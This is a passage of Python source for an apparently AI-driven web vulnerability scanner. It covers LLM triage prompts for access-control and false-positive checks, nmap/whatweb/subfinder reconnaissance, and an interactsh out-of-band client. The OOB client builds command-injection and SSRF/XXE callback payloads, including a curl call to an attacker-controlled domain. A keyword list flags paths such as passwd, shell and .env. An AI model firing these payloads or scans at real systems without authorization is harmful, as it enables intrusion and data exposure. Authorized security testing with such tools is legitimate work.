        if len(body) > 15000 or len(sens) > 3:
            preview_chars = min(preview_chars, 450)
        body_preview = self._clean(body, preview_chars)
        sens_summary = [
            {"label": s.get("label", ""), "key": s.get("key", "")}
            for s in sens[:4]
        ]
        analysis_timeout = PAGE_ANALYSIS_AI_TIMEOUT_SEC
        if preview_chars <= 450 or len(sens) > 2:
            analysis_timeout = PAGE_ANALYSIS_AI_TIMEOUT_FALLBACK_SEC
        prompt = f"""Analyze this HTTP response for security testing.
URL: {url}
Status: {status}
Title: {title}
Body size: {len(body)}
Sensitive data hints: {json.dumps(sens_summary)}
Body (first {preview_chars}): {body_preview}

Return JSON: {{
  "is_real_page": true,
  "is_auth_wall": false,
  "is_bac_candidate": false,
  "is_custom_404": false,
  "page_type": "login|admin|api|dashboard|config|error|static|unknown",
  "description": "what this page does",
  "sensitive_data": [],
  "injection_points": ["param1","param2"],
  "suggested_child_paths": [],
  "risk": "Critical|High|Medium|Low|Info",
  "recommended_tests": ["sqli","xss","lfi","idor","ssrf","cmdi","ssti"]
}}"""
        result = self._call(
            prompt,
            cache=True,
            timeout_sec=analysis_timeout,
            retries=2,
        )
        if not result and preview_chars > 450:
            compact_preview = self._clean(body, 420)
            compact_prompt = f"""Classify this HTTP response for page triage.
URL: {url}
Status: {status}
Title: {title}
Content-Type: {str((headers or {}).get("Content-Type", ""))[:120]}
Body size: {len(body)}
Sensitive hints: {json.dumps(sens_summary)}
Body (first 420): {compact_preview}

Return JSON: {{
  "is_real_page": true,
  "is_auth_wall": false,
  "is_bac_candidate": false,
  "is_custom_404": false,
  "page_type": "login|admin|api|dashboard|config|error|static|unknown",
  "description": "short summary",
  "sensitive_data": [],
  "injection_points": [],
  "suggested_child_paths": [],
  "risk": "Critical|High|Medium|Low|Info",
  "recommended_tests": []
}}"""
            result = self._call(
                compact_prompt,
                cache=True,
                timeout_sec=PAGE_ANALYSIS_AI_TIMEOUT_FALLBACK_SEC,
                retries=2,
            )
        if result:
            self._page_analysis_cache[cache_key] = copy.deepcopy(result)
            return result
        fallback = {
            "is_real_page": is_200.get("real", False),
            "page_type": "unknown",
            "sensitive_data": [s["key"] for s in sens],
            "injection_points": [],
            "suggested_child_paths": [],
            "risk": "Info",
            "recommended_tests": [],
        }
        self._page_analysis_cache[cache_key] = copy.deepcopy(fallback)
        return fallback

    # ── BAC Analysis ──────────────────────────────────────────────────────────
    def analyze_bac(self, bac_data: dict) -> Optional[dict]:
        prompt = f"""Analyze multi-role access control comparison.
URL: {bac_data['url']}
Role responses: {json.dumps(bac_data['responses'], indent=2)}
Comparison signals: {json.dumps(bac_data['comparisons'], indent=2)}
Is this a real Broken Access Control (BAC/IDOR)?
Return JSON: {{"found":true,"owasp_id":"A01","risk":"High","confidence":80,"title":"...","technical":"...","exploitable":true,"exploit_cmd":"...","remediation":"..."}}"""
        return self._call(prompt, cache=False)

    # ── 403 Analysis ──────────────────────────────────────────────────────────
    def analyze_403_response(self, parent_url: str, child_url: str,
                              child_status: int, child_body: str,
                              child_headers: dict, context: str = "") -> Optional[dict]:
        title_m    = re.search(r'<title[^>]*>(.*?)</title>', child_body, re.I|re.S)
        page_title = title_m.group(1).strip() if title_m else ""
        ct_hdr     = child_headers.get("content-type", child_headers.get("Content-Type",""))
        body_lines = child_body.split("\n")
        body_preview = self._clean("\n".join(body_lines[:60]), 4000)

        prompt = f"""A parent URL returned 403 (forbidden), but a child URL returned {child_status}.
Determine if this is a real Broken Access Control (BAC) or just a static/login/error page.

Parent: {parent_url}
Child:  {child_url}
Content-Type: {ct_hdr}
Title: "{page_title}"
Body size: {len(child_body)} bytes

Body (first 60 lines):
---
{body_preview}
---

CATEGORIES:
1. "static_asset" — CSS/JS/image/font under admin path (NOT a BAC)
2. "login_redirect" — login form shown (NOT a BAC)
3. "error_page" — 404/error/empty page (NOT a BAC)
4. "real_bac" — actual protected admin data, user records, config, API keys (IS a BAC)

RULES:
- CSS files (.class{{color:red}}, @media, @import) → static_asset
- JS files (function, var, const, import) → static_asset
- Login forms (password field, "sign in") → login_redirect
- Must PROVE sensitive data exposure for real_bac

Return JSON: {{
  "verdict": "static_asset|login_redirect|error_page|real_bac",
  "is_real_bac": false,
  "confidence": 0,
  "content_type_detected": "css|javascript|html|json|image|unknown",
  "what_i_see": "description of content",
  "reason": "technical reasoning citing actual body content",
  "evidence": "exact snippet proving verdict",
  "sensitive_data_found": ""
}}"""
        return self._call(prompt, cache=False)

    # ── Fuzz Baseline Analysis ────────────────────────────────────────────────
    def analyze_fuzz_baseline(self, base_url: str, probes: list) -> dict:
        prompt = f"""Analyze these 5 random URL probe results to determine ffuf filter settings.

Target: {base_url}
Probes: {json.dumps(probes, indent=2)}

Determine optimal filters to reject false positives.
RULES:
1. All same status → filter_codes
2. Sizes within 5% → filter_sizes
3. Word count stable → filter_words
4. Lines stable → filter_lines

Return JSON: {{
  "filter_codes": [],
  "filter_sizes": [],
  "filter_words": [],
  "filter_lines": [],
  "tolerance_bytes": 20,
  "recursive": true,
  "explanation": "what pattern I found"
}}"""
        return self._call(prompt, cache=False) or {}

    # ── Dir Hit Analysis ──────────────────────────────────────────────────────
    def analyze_dir_hit(self, url: str, status: int, size: int,
                         words: int, lines: int, body: str,
                         profile: "SmartFuzzProfile") -> dict:
        title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        title   = title_m.group(1).strip()[:60] if title_m else ""
        norm_body = re.sub(r"\d{2,}", "#", (body or "").lower())
        norm_body = re.sub(r"\s+", " ", norm_body).strip()
        cache_material = {
            "status": int(status or 0),
            "size_bucket": int(size or 0) // 32,
            "words_bucket": int(words or 0) // 5,
            "lines_bucket": int(lines or 0) // 3,
            "title": title.lower(),
            "body_hash": hashlib.md5(norm_body[:1600].encode("utf-8", errors="replace")).hexdigest(),
            "profile": {
                "codes": sorted(profile.filter_codes or []),
                "sizes": sorted(profile.filter_sizes or [])[:6],
                "words": sorted(profile.filter_words or [])[:6],
                "lines": sorted(profile.filter_lines or [])[:6],
            },
        }
        cache_key = hashlib.md5(
            json.dumps(cache_material, sort_keys=True).encode("utf-8", errors="replace")
        ).hexdigest()
        cached = self._dir_hit_verdict_cache.get(cache_key)
        if cached is not None:
            return copy.deepcopy(cached)
        prompt = f"""Fuzzer found URL. Is it a real sensitive finding?

404 signature: fc={profile.filter_codes} fs={profile.filter_sizes} fw={profile.filter_words}
URL: {url}
Status: {status}, Size: {size}, Words: {words}, Lines: {lines}
Title: "{title}"
Body: {body[:800]}

Return JSON: {{
  "type": "admin|config|backup|api|static|error|login|unknown",
  "is_sensitive": false,
  "is_directory": false,
  "risk": "Critical|High|Medium|Low|Info",
  "confidence": 0,
  "owasp_id": "A05",
  "owasp_name": "Security Misconfiguration",
  "title": "finding title",
  "reason": "explanation",
  "remediation": "how to fix"
}}"""
        result = self._call(prompt, cache=True)
        if result:
            self._dir_hit_verdict_cache[cache_key] = copy.deepcopy(result)
            return result
        url_l  = url.lower()
        is_s   = any(k in url_l for k in [
            "admin","config","backup","secret",".env","db","debug","shell","passwd","key","api"
        ])
        return {
            "type": "unknown", "is_sensitive": is_s, "is_directory": False,
            "risk": "Medium" if is_s else "Info",
            "confidence": 60 if is_s else 20,
            "owasp_id": "A05", "owasp_name": "Security Misconfiguration",
            "title": f"Exposed: {url}",
            "reason": "URL contains sensitive keyword" if is_s else "",
            "remediation": "Restrict access.",
        }

    # ── FP Filter ─────────────────────────────────────────────────────────────
    def fp_filter(self, f: "Finding") -> dict:
        title_l = f.title.lower()
        is_bac = (
            f.owasp_id == "A01" or
            "403" in f.title or
            "bypass" in title_l or
            "no auth required" in title_l
        )
        bac_rules = """
EXTRA BAC RULES:
- CSS/JS body → is_fp=true (static assets)
- URL ends in .css/.js/.png/.jpg/.ico/.woff/.svg → is_fp=true
- Body contains only login form with no admin data → is_fp=true
- Response is identical to public page → is_fp=true
""" if is_bac else ""

        prompt = f"""Is this security finding a FALSE POSITIVE? Be strict.

Title: {f.title}
OWASP: {f.owasp_id} — {f.owasp_name}
Risk: {f.risk}, Confidence: {f.confidence}%
URL: {f.url}
Payload: {f.payload[:200]}
Evidence: {f.evidence}
Baseline diff: {f.baseline_diff}

Response body (first {1500 if is_bac else 400} chars):
{self._clean(f.response_raw, 1500 if is_bac else 400)}

Tool output:
{self._clean(f.tool_output, 300)}
{bac_rules}

RULES:
- No concrete exploitation evidence → is_fp=true
- Generic error/WAF block → is_fp=true
- Real evidence of vulnerability → is_fp=false

Return JSON: {{"is_fp": false, "reason": "specific reason", "adjusted_confidence": 75}}"""
        return self._call(prompt, cache=True) or {
            "is_fp": False, "reason": "", "adjusted_confidence": f.confidence
        }

    # ── Login Fields ──────────────────────────────────────────────────────────
    def verify_sensitive_candidates(self, url: str, headers: dict, body: str,
                                    response_profile: dict,
                                    candidates: List[dict]) -> dict:
        normalized = [
            {
                "key": c.get("key", ""),
                "label": c.get("label", ""),
                "value": c.get("value", "")[:80],
                "risk": c.get("risk", "High"),
                "strong": bool(c.get("strong")),
                "snippet": c.get("snippet", "")[:180],
            }
            for c in (candidates or [])[:6]
        ]
        cache_key = hashlib.md5(
            json.dumps(normalized, sort_keys=True).encode("utf-8", errors="ignore")
        ).hexdigest()
        cached = self._sensitive_verdict_cache.get(cache_key)
        if cached:
            return copy.deepcopy(cached)

        ct = ResponseClassifier.normalize_content_type(headers)
        prompt = f"""Determine whether these extracted response candidates are REAL sensitive secrets exposed to the client.

URL: {url}
Response class: {response_profile.get('verdict', 'unknown')}
Content-Type: {ct or 'unknown'}
Candidates: {json.dumps(normalized, ensure_ascii=False)}

Rules:
- Keywords alone are NOT secrets.
- Frontend labels, placeholders, docs, examples, or enum keys are NOT secrets.
- A real finding requires an actual credential/token/key/DSN/PEM/JWT-like value.
- Be strict with JavaScript/CSS/public page content.

Return JSON: {{
  "is_sensitive": false,
  "confidence": 0,
  "risk": "Info|Low|Medium|High|Critical",
  "reason": "short technical reason",
  "evidence": "short proof",
  "confirmed": false,
  "confirmed_candidates": []
}}"""
        result = self._call_required(
            prompt,
            purpose="sensitive data verification",
            cache=True,
            timeout_sec=min(AI_CALL_TIMEOUT_SEC, 12),
            retries=4,
        )
        verified = self._validate(result)
        self._sensitive_verdict_cache[cache_key] = copy.deepcopy(verified)
        return verified

    def verify_access_exposure(self, vector: str, url: str, method: str,
                               baseline: dict, candidate: dict,
                               baseline_profile: dict, candidate_profile: dict,
                               sensitive_candidates: List[dict]) -> dict:
        normalized_candidates = [
            {
                "label": c.get("label", ""),
                "value": c.get("value", "")[:60],
                "strong": bool(c.get("strong")),
            }
            for c in (sensitive_candidates or [])[:5]
        ]
        cache_key = hashlib.md5(
            json.dumps(
                {
                    "vector": vector,
                    "url": url,
                    "method": method,
                    "baseline_hash": hashlib.md5(str(baseline.get("body", "")).encode()).hexdigest(),
                    "candidate_hash": hashlib.md5(str(candidate.get("body", "")).encode()).hexdigest(),
                    "baseline_status": baseline.get("status", 0),
                    "candidate_status": candidate.get("status", 0),
                    "candidate_profile": candidate_profile.get("verdict", "unknown"),
                    "sensitive": normalized_candidates,
                },
                sort_keys=True,
            ).encode("utf-8", errors="ignore")
        ).hexdigest()
        cached = self._access_verdict_cache.get(cache_key)
        if cached:
            return copy.deepcopy(cached)

        prompt = f"""Decide whether this mutation demonstrates REAL unauthorized access.

Vector: {vector}
Method: {method}
URL: {url}
Baseline status: {baseline.get('status', 0)}
Candidate status: {candidate.get('status', 0)}
Baseline class: {baseline_profile.get('verdict', 'unknown')}
Candidate class: {candidate_profile.get('verdict', 'unknown')}
Sensitive candidates: {json.dumps(normalized_candidates, ensure_ascii=False)}

Baseline preview:
{self._clean(str(baseline.get('body', '')), 700)}

Candidate preview:
{self._clean(str(candidate.get('body', '')), 900)}

Rules:
- Public page, static asset, login page, or same public content => false.
- A real finding requires protected/admin/account/config/secret data or a clearly unauthorized privileged view.
- Be strict. If unclear, return false.

Return JSON: {{
  "is_real": false,
  "confidence": 0,
  "risk": "Info|Low|Medium|High|Critical",
  "reason": "short technical reason",
  "evidence": "short proof",
  "confirmed": false
}}"""
        result = self._call_required(
            prompt,
            purpose=f"{vector.lower()} verification",
            cache=True,
            timeout_sec=min(AI_CALL_TIMEOUT_SEC, 12),
            retries=4,
        )
        verified = self._validate(result)
        self._access_verdict_cache[cache_key] = copy.deepcopy(verified)
        return verified

    def identify_login_fields(self, html_body: str, url: str) -> dict:
        prompt = f"""Identify login form field names.
URL: {url}
HTML: {html_body[:3000]}
Return JSON: {{"username_field":"username","password_field":"password","csrf_field":"csrf_token","action_url":"/login"}}"""
        result = self._call(prompt) or {}
        return {
            "username_field": result.get("username_field","username"),
            "password_field": result.get("password_field","password"),
            "csrf_field":     result.get("csrf_field","csrf_token"),
            "action_url":     result.get("action_url", url),
        }

    # ── Endpoint Planning ─────────────────────────────────────────────────────
    def plan_endpoints(self, endpoints: List["Endpoint"]) -> List["Endpoint"]:
        if not endpoints: return endpoints
        # Dedup by template
        seen, deduped = set(), []
        for ep in endpoints:
            key = (ep.template or ep.url, ep.method)
            if key not in seen:
                seen.add(key)
                deduped.append(ep)
        endpoints = deduped

        summary = [
            {"url": ep.url, "method": ep.method,
             "params": list(ep.params.keys())[:6], "source": ep.discovered_by,
             "score": ep.score}
            for ep in endpoints
        ]
        prompt = f"""Prioritize {len(endpoints)} endpoints for OWASP testing.
High priority: login, admin, API, id params, file/path params, upload endpoints.
Return JSON: {{"priority_urls": ["http://...", ...]}}

Endpoints: {json.dumps(summary, indent=2)}"""
        result   = self._call(prompt) or {}
        priority = result.get("priority_urls", [])
        if not priority:
            return sorted(endpoints, key=lambda e: -e.score)
        url_map  = {ep.url: ep for ep in endpoints}
        ordered  = [url_map[u] for u in priority if u in url_map]
        rest     = [ep for ep in endpoints if ep.url not in set(priority)]
        return ordered + sorted(rest, key=lambda e: -e.score)

    # ── Correlation ───────────────────────────────────────────────────────────
    def correlate(self, signals: list) -> list:
        if len(signals) < 2: return []
        prompt = f"""Multiple weak security signals from scan:
{json.dumps(signals[:20], indent=2)}
Which signals together form confirmed vulnerabilities?
Return JSON array: [{{"owasp_id":"A01","title":"...","risk":"High","confidence":70,"evidence":"..."}}]"""
        result = self._call(prompt, cache=False, expect_list=True)
        if isinstance(result, list): return result
        if isinstance(result, dict) and "findings" in result: return result["findings"]
        return []

    # ── Final Assessment ──────────────────────────────────────────────────────
    def final_assessment(self, findings: List["Finding"], target: str,
                          tech: dict) -> str:
        summary = [{"title": f.title, "risk": f.risk, "owasp": f.owasp_id,
                    "url": f.url} for f in findings[:20]]
        prompt = f"""Write a professional penetration test security assessment.

Target: {target}
Technology: {json.dumps(tech)}
Confirmed findings ({len(findings)}):
{json.dumps(summary, indent=2)}

Format:
1. OVERALL RATING: Critical/High/Medium/Low
2. KEY VULNERABILITIES: What was found and impact
3. ATTACK VECTORS: How an attacker would exploit these
4. RECOMMENDATIONS: Priority fix list
5. CONCLUSION: 2-3 sentence summary

Return as plain text (no JSON)."""
        if not HAS_OLLAMA: return "AI assessment unavailable."
        try:
            raw = self._chat_text(
                [
                    {"role": "system", "content": "You are a senior penetration tester writing professional reports."},
                    {"role": "user",   "content": prompt},
                ],
                timeout_sec=AI_CALL_TIMEOUT_SEC,
            )
            return str(raw).strip()
        except Exception as e:
            return f"AI assessment error: {e}"


# ─────────────────────────────────────────────────────────────────────────────
# RECON ENGINE
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ReconResult:
    target_input: str
    resolved_ip:  str
    open_ports:   list
    http_targets: list
    subdomains:   list
    waf:          str
    tech_stack:   dict
    os_guess:     str
    hostnames:    list
    raw_nmap:     str
    raw_whatweb:  str


class ReconEngine:
    WEB_PORTS = [
        80, 443, 8080, 8443, 8000, 8001, 8008, 8888,
        3000, 3001, 4000, 4443, 5000, 5001, 6443,
        7000, 7001, 9000, 9090, 9443, 10000,
        8081, 8082, 8083, 8084, 8085,
        3128, 3306, 5432, 6379, 9200, 27017,
    ]

    def __init__(self, ai: AIEngine):
        self.ai = ai

    def run(self, raw: str) -> ReconResult:
        console.print(f"\n[cyan]━━ RECON ━━[/cyan]")
        host, port_hint, is_ip, has_scheme = self._parse(raw)
        resolved_ip, hostnames             = self._resolve(host)
        open_ports, os_guess, raw_nmap     = self._nmap(resolved_ip or host, port_hint)
        http_targets                       = self._build_targets(
            host, resolved_ip or host, open_ports, port_hint, has_scheme, raw
        )
        waf            = self._detect_waf(
            http_targets[0]["url"] if http_targets else f"http://{host}"
        )
        tech_stack, raw_whatweb = self._whatweb(
            http_targets[0]["url"] if http_targets else f"http://{host}"
        )
        subdomains = []
        if not is_ip and "." in host and not any(
            host.startswith(p) for p in ["10.","192.168.","172."]
        ):
            subdomains = self._subdomain_discovery(host)

        result = ReconResult(
            target_input=raw, resolved_ip=resolved_ip or host,
            open_ports=open_ports, http_targets=http_targets,
            subdomains=subdomains, waf=waf, tech_stack=tech_stack,
            os_guess=os_guess, hostnames=hostnames,
            raw_nmap=raw_nmap, raw_whatweb=raw_whatweb,
        )
        self._print_summary(result)
        return result

    def _parse(self, raw: str) -> tuple:
        has_scheme = raw.startswith(("http://","https://"))
        if has_scheme:
            p = urllib.parse.urlparse(raw)
            return (p.hostname or raw), p.port, \
                   bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', p.hostname or "")), True
        if ":" in raw and raw.count(":") == 1:
            h, _, pt = raw.rpartition(":")
            try:
                return h, int(pt), bool(re.match(r'^\d+\.\d+\.\d+\.\d+$',h)), False
            except ValueError:
                pass
        is_ip = bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', raw))
        return raw, None, is_ip, False

    def _resolve(self, host: str) -> tuple:
        hostnames = []
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = None
        if ip:
            try:
                ptr = socket.gethostbyaddr(ip)[0]
                if ptr != host: hostnames.append(ptr)
            except Exception:
                pass
        return ip or host, hostnames

    def _nmap(self, host: str, port_hint: Optional[int] = None) -> tuple:
        if not shutil.which("nmap"):
            return [], "unknown", ""
        if port_hint:
            cmd = (f"nmap -sV --version-intensity 4 -p {port_hint} "
                   f"--open -T4 --script=http-title,banner {host}")
            r = _run_cmd(cmd, timeout=120)
            raw = r.get("output","")
            return self._parse_nmap(raw), self._parse_os(raw), raw
        top_cmd = (f"nmap -sV --version-intensity 4 --top-ports 200 "
                   f"--open -T4 --script=http-title,banner {host}")
        extra_ports = ",".join(str(p) for p in sorted(set(self.WEB_PORTS)))
        extra_cmd = (f"nmap -sV --version-intensity 4 -p {extra_ports} "
                     f"--open -T4 --script=http-title,banner {host}")
        top_raw = _run_cmd(top_cmd, timeout=120).get("output","")
        extra_raw = _run_cmd(extra_cmd, timeout=90).get("output","")
        merged_ports = self._merge_open_ports(
            self._parse_nmap(top_raw) + self._parse_nmap(extra_raw)
        )
        os_guess = self._parse_os(top_raw)
        if not os_guess or os_guess == "unknown":
            os_guess = self._parse_os(extra_raw)
        raw = "\n\n".join(x for x in [top_raw, extra_raw] if x)
        return merged_ports, os_guess or "unknown", raw

    def _parse_nmap(self, out: str) -> list:
        ports, pat = [], re.compile(r'^(\d+)/tcp\s+open\s+(\S+)\s*(.*?)$', re.MULTILINE)
        for m in pat.finditer(out):
            port = int(m.group(1))
            svc  = m.group(2).lower()
            ver  = m.group(3).strip()
            ssl  = "ssl" in svc or port in (443,8443,4443)
            ports.append({
                "port": port, "service": svc, "version": ver, "ssl": ssl,
                "is_web": port in self.WEB_PORTS or "http" in svc,
            })
        return ports

    def _merge_open_ports(self, ports: List[dict]) -> List[dict]:
        merged: Dict[int, dict] = {}
        for port_info in ports:
            port = int(port_info.get("port", 0) or 0)
            if not port:
                continue
            current = merged.get(port)
            if not current:
                merged[port] = dict(port_info)
                continue
            if current.get("service") in {"", "unknown"} and port_info.get("service"):
                current["service"] = port_info["service"]
            if len(str(port_info.get("version", ""))) > len(str(current.get("version", ""))):
                current["version"] = port_info.get("version", "")
            current["ssl"] = bool(current.get("ssl")) or bool(port_info.get("ssl"))
            current["is_web"] = bool(current.get("is_web")) or bool(port_info.get("is_web"))
        return [merged[p] for p in sorted(merged)]

    def _parse_os(self, out: str) -> str:
        m = re.search(r'OS details?:\s*(.+?)\n', out)
        if m: return m.group(1).strip()
        m = re.search(r'Aggressive OS guesses?:\s*(.+?)\n', out)
        return m.group(1).strip() if m else "unknown"

    def _build_targets(self, host, ip, open_ports, port_hint, has_scheme, raw_input) -> list:
        targets, checked = [], set()
        if port_hint and has_scheme:
            scheme = "https" if "https" in raw_input else "http"
            url    = f"{scheme}://{host}:{port_hint}" if port_hint not in (80,443) \
                     else f"{scheme}://{host}"
            return [{"url":url.rstrip("/"), "port":port_hint, "ssl":scheme=="https","source":"input"}]
        if has_scheme and not port_hint:
            parsed = urllib.parse.urlparse(raw_input)
            scheme = (parsed.scheme or "").lower()
            default_port = 443 if scheme == "https" else 80
            preferred_url = f"{scheme}://{host}" if scheme in ("http", "https") else ""
            if preferred_url and self._alive(preferred_url):
                targets.append({
                    "url": preferred_url.rstrip("/"),
                    "port": default_port,
                    "ssl": scheme == "https",
                    "source": "input",
                })
                checked.add(default_port)
        if port_hint:
            for scheme in ("http","https"):
                url = f"{scheme}://{host}:{port_hint}"
                if self._alive(url):
                    targets.append({"url":url,"port":port_hint,"ssl":scheme=="https","source":"port_hint"})
                    checked.add(port_hint)
            if targets: return targets
        for p in sorted([p for p in open_ports if p.get("is_web")],
                        key=lambda x: (0 if x["port"] in (80,443) else 1, x["port"]))[:10]:
            port = p["port"]
            if port in checked: continue
            ssl  = p.get("ssl") or port in (443,8443)
            url  = f"{'https' if ssl else 'http'}://{host}" + (
                f":{port}" if port not in (80,443) else ""
            )
            if self._alive(url):
                targets.append({"url":url.rstrip("/"),"port":port,"ssl":ssl,"source":"nmap"})
                checked.add(port)
        if not targets:
            for url in [f"http://{host}", f"https://{host}"]:
                if self._alive(url):
                    targets.append({"url":url,"port":443 if "https" in url else 80,
                                    "ssl":"https" in url,"source":"default"})
        console.print(f"  [dim]  HTTP targets: {len(targets)} found[/dim]")
        for t in targets:
            console.print(f"  [dim]    {'🔒' if t['ssl'] else '🌐'} {t['url']}[/dim]")
        return targets

    def _alive(self, url: str) -> bool:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        try:
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            with urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            ).open(req, timeout=5) as r:
                return r.status < 600
        except Exception:
            return False

    def _detect_waf(self, url: str) -> str:
        if shutil.which("wafw00f"):
            r = _run_cmd(f"wafw00f '{url}' -a 2>/dev/null", timeout=30)
            m = re.search(r"is behind (.+?) (?:WAF|firewall)", r.get("output",""), re.I)
            if m: return m.group(1).strip()
        return "unknown"

    def _whatweb(self, url: str) -> tuple:
        if not shutil.which("whatweb"): return {}, ""
        r   = _run_cmd(f"whatweb --color=never '{url}' 2>/dev/null", timeout=30)
        out = r.get("output","")
        tech = {}
        for m in re.finditer(r"(\w[\w.-]+)\[([^\]]+)\]", out):
            if m.group(1) not in ("HTTPServer","IP","Country","Script","HTML5"):
                tech[m.group(1)] = m.group(2)
        return tech, out

    def _subdomain_discovery(self, domain: str) -> list:
        subs = set()
        if shutil.which("subfinder"):
            r = _run_cmd(f"subfinder -d '{domain}' -silent 2>/dev/null", timeout=60)
            for line in r.get("output","").splitlines():
                if domain in line: subs.add(line.strip().lower())
        for sub in ["www","api","dev","staging","test","admin","app","portal","auth"]:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                subs.add(f"{sub}.{domain}")
            except Exception:
                pass
        return sorted(subs)[:50]

    def _print_summary(self, r: ReconResult):
        if not HAS_RICH:
            print(f"  IP:{r.resolved_ip} WAF:{r.waf} Ports:{len(r.open_ports)}")
            return
        port_entries = [
            f"{p['port']}/{p.get('service','?')}{' [web]' if p.get('is_web') else ''}"
            for p in sorted(r.open_ports, key=lambda x: x.get("port", 0))
        ]
        port_summary = ", ".join(port_entries[:10]) if port_entries else "-"
        if len(port_entries) > 10:
            port_summary += f" (+{len(port_entries) - 10} more)"
        t = Table(title=f"Recon: {r.target_input}", box=box.ROUNDED)
        t.add_column("Item", style="cyan", width=18)
        t.add_column("Value")
        t.add_row("IP",           r.resolved_ip or "?")
        t.add_row("OS",           r.os_guess[:60] or "unknown")
        t.add_row("WAF",          r.waf)
        t.add_row("Open ports",   str(len(r.open_ports)))
        t.add_row("Port details", port_summary)
        t.add_row("HTTP targets", str(len(r.http_targets)))
        t.add_row("Subdomains",   str(len(r.subdomains)))
        t.add_row("Tech",         ", ".join(list(r.tech_stack.keys())[:8]))
        console.print(t)


# ─────────────────────────────────────────────────────────────────────────────
# OOB CLIENT
# ─────────────────────────────────────────────────────────────────────────────
class OOBClient:
    def __init__(self):
        self.domain   = ""
        self._results: List[str] = []
        self._proc    = None
        self._lock    = threading.Lock()

    def start(self) -> bool:
        if not shutil.which("interactsh-client"): return False
        try:
            self._proc = subprocess.Popen(
                ["interactsh-client","-json","-v"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )
            for _ in range(40):
                line = self._proc.stdout.readline()
                if not line: time.sleep(0.2); continue
                try:
                    data = json.loads(line)
                    if data.get("domain"):
                        self.domain = data["domain"]
                        threading.Thread(target=self._reader, daemon=True).start()
                        console.print(f"  [green]✓ OOB: {self.domain}[/green]")
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def _reader(self):
        for line in self._proc.stdout:
            if line:
                with self._lock: self._results.append(line.strip())

    def check(self, token: str = "", wait: float = 2.0) -> bool:
        time.sleep(wait)
        with self._lock:
            return any((not token or token in r) for r in self._results)

    def payloads(self, token: str = "") -> dict:
        sfx = f"{token}.{self.domain}" if token else self.domain
        return {
            "http":  f"http://{sfx}/test",
            "ssrf":  f"http://{sfx}/ssrf",
            "xxe":   f"http://{sfx}/xxe",
            "cmdi":  f"curl http://{sfx}/cmd",
            "dns":   sfx,
        }

    def stop(self):
        if self._proc:
            try: self._proc.terminate()
            except: pass


# ─────────────────────────────────────────────────────────────────────────────
# BASELINE ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class BaselineEngine:
    def __init__(self, client: HTTPClient):
        self.client         = client
        self._cache:  dict  = {}
        self._404fp:  Optional[BaselineFingerprint] = None
        self._waf:    bool  = False

    def build_custom_404(self, base_url: str):
        rand = f"/pentest_404_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        r    = self.client.get(base_url.rstrip("/") + rand)
        if r["status"] != 0:
            self._404fp = BaselineFingerprint(
                status=r["status"], body_len=len(r["body"]),
                body_hash=hashlib.md5(r["body"].encode()).hexdigest(),
                title=self._title(r["body"]), timing_avg=r["timing"],
                headers_sig="", word_count=len(r["body"].split()),
                error_strings=self._errors(r["body"]),
            )

    def build_smart_profile(self, base_url: str, ai: AIEngine,
                             depth: int = 2) -> SmartFuzzProfile:
        import random, string
        base   = base_url.rstrip("/")
        probes = []
        paths  = [
            f"/{''.join(random.choices(string.ascii_lowercase, k=12))}",
            f"/{''.join(random.choices(string.ascii_lowercase, k=8))}.php",
            f"/admin_{''.join(random.choices(string.digits, k=6))}",
            f"/api/{''.join(random.choices(string.ascii_lowercase, k=10))}",
            f"/{''.join(random.choices(string.ascii_lowercase, k=6))}/{''.join(random.choices(string.ascii_lowercase, k=6))}",
        ]
        for path in paths:
            r = self.client.get(base + path)
            if r["status"] == 0: continue
            body  = r["body"]
            b_hash = hashlib.md5(body.encode()).hexdigest()
            probes.append({
                "path": path, "status": r["status"], "size": len(body),
                "words": len(body.split()), "lines": body.count("\n"),
                "title": self._title(body), "hash": b_hash,
            })
        if not probes:
            return SmartFuzzProfile(
                base_url=base, probe_results=[], filter_codes=[], filter_sizes=[],
                filter_words=[], filter_lines=[], filter_hashes=[], match_codes=[200,201,301,302],
                tolerance_bytes=20, ai_explanation="No probes", recursive=True, depth=depth,
            )
        ai_result  = ai.analyze_fuzz_baseline(base, probes)
        fc = ai_result.get("filter_codes", [])
        fs = ai_result.get("filter_sizes", [])
        fw = ai_result.get("filter_words", [])
        fl = ai_result.get("filter_lines", [])
        if not fc and not fs:
            fc, fs, fw, fl = self._heuristic_filters(probes)

        p = SmartFuzzProfile(
            base_url=base, probe_results=probes,
            filter_codes=fc, filter_sizes=fs, filter_words=fw, filter_lines=fl,
            filter_hashes=list({p["hash"] for p in probes}),
            match_codes=[200,201,204,301,302,307],
            tolerance_bytes=ai_result.get("tolerance_bytes", 20),
            ai_explanation=ai_result.get("explanation",""),
            recursive=ai_result.get("recursive", True), depth=depth,
        )
        console.print(f"  [bold cyan]  SmartProfile:[/bold cyan] [dim]{p.summary()}[/dim]")
        return p

    def _heuristic_filters(self, probes: list) -> tuple:
        statuses = [p["status"] for p in probes]
        sizes    = [p["size"]   for p in probes]
        words    = [p["words"]  for p in probes]
        hashes   = [p["hash"]   for p in probes]
        fc, fs, fw, fl = [], [], [], []
        if len(set(statuses)) == 1: fc = list(set(statuses))
        if sizes:
            avg = sum(sizes) / len(sizes)
            dev = max(abs(s - avg) for s in sizes) / max(avg, 1)
            if dev < 0.05: fs = list(set(sizes))
            elif dev < 0.15 and len(set(words)) <= 2: fw = list(set(words))
        if len(set(hashes)) == 1:
            if not fc: fc = list(set(statuses))
            if not fs: fs = list(set(sizes))
        return fc, fs, fw, fl

    def get(self, ep: "Endpoint") -> BaselineFingerprint:
        key = f"{ep.method}:{ep.url}"
        if key in self._cache:
            return self._cache[key]
        timings, sizes, hashes, statuses, bodies = [], [], [], [], []

        def _req():
            return self.client.get(ep.url) if ep.method == "GET" \
                else self.client.post(ep.url, data=ep.params)

        r0 = _req()
